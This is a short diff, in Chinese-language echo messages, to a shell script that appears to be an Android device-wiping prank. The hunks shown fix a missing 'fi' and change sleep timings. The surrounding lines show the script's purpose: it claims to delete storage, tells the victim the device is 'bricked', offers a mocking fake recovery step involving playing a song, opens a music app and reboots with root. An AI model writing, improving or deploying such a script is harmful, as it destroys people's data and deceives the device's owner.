@@ -39,6 +39,7 @@ then
   else
     echo "\033[0;31;1m[!]自取失败 你似乎没有ROOT权限\033[0m"
     exit 0
+  fi
 fi
 else
 echo "\033[0;31;1m[!]已取消格机\033[0;33;1m 这是个明智的选择\033[0m"
@@ -56,9 +57,9 @@ sleep 0.5
 echo "\033[0;32;1m-storage已删除\033[0m"
 sleep 1
 echo "\033[0;33;1m[-]你的设备已成砖 插上数据线连上电脑并播放音乐#ТАМАДА即可救回\033[0m"
-sleep 0.75
+sleep 1.25
 echo "\033[0;33;1m->即将打开酷狗音乐 >>\033[0m"
-sleep 1
+sleep 1.25
 am start com.kugou.android/com.kugou.android.app.MediaActivity
 sleep 5
 su -c reboot
